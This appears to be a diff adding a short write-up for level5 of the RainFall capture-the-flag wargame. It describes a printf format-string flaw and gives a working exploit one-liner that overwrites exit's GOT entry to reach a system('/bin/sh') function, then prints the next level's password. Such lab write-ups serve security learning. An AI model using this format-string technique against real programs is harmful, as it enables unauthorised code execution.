@@ -1,0 +1,41 @@
+there are 3 functions 
+
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+
+and also a global variable
+
+0x08049854  m
+
+
+main call function n
+
+function n read a string from input
+and print it using printf as format string, this is the vulnerability
+and then call exit(1)
+
+
+
+and function o call system(/bin/sh)
+
+so we find the offset 
+level5@RainFall:~$ python -c 'print("AAAA"+"%x "*5)' | ./level5
+AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825
+
+offset is 4
+
+the function exit jumps at the address 0x08049838
+
+(gdb) disas exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    *0x8049838
+
+
+with the printf vuln we need to overwrite the address of exit's jump  0x0804983 with the adress of o 0x080484a4
+
+the binary value of 0x080484a4 is 134513828
+
+level5@RainFall:~$ (python -c 'print("\x08\x04\x98\x38"[::-1]+"%134513824d"+"%4$n")';cat ) | ./level5 | tr -d " "
+cd ../level6 ; cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
